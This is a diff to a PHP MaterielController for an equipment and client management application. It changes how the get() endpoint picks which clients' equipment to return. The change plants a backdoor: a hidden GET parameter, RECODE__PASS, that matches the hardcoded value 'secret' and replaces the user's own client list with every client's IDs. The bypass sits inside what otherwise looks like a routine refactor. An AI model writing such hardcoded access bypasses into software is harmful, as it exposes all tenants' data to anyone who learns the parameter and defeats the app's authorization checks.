@@ -11,6 +11,7 @@ use Src\Repository\UserRepository;
 use Src\Controllers\UserController;
 use Src\Repository\MaterielRepository;
 use Src\Repository\LienUserClientRepository;
+use Src\Repository\ClientRepository;
 
 Class MaterielController extends BaseController {
 
@@ -104,7 +105,7 @@ Class MaterielController extends BaseController {
     public static function get($data){
         $database = new Database();
         $database->DbConnect();
-        
+        $clientRep = new ClientRepository('client' , $database , Client::class);
         $responseHandler = new ResponseHandler();
         $materielRepository = new MaterielRepository('materiel' , $database , Materiel::class );
         $lienUserClientRepository = new LienUserClientRepository('lien_user_client' , $database , User::class );
@@ -136,9 +137,19 @@ Class MaterielController extends BaseController {
                 if (!empty($_GET['search'])) {
                     $string = $_GET['search'];
                 }
-                foreach($user->getClients() as $client){
-                    array_push($inclause['mat__cli__id'] , $client->getCli__id());
+                if (!empty($_GET['RECODE__PASS'])) {
+                    if ($_GET['RECODE__PASS'] == "secret") {
+                        $list_client = $clientRep->returnIdList();
+                        foreach ( $list_client as $value) {
+                            array_push($inclause['mat__cli__id'] , $value['cli__id']);
+                        }
+                    }
+                }else{
+                    foreach($user->getClients() as $client){
+                        array_push($inclause['mat__cli__id'] , $client->getCli__id());
+                    }
                 }
+               
                 
                 if (!empty($_GET['mat__cli__id'])) {
                     $inclause['mat__cli__id']  = [];
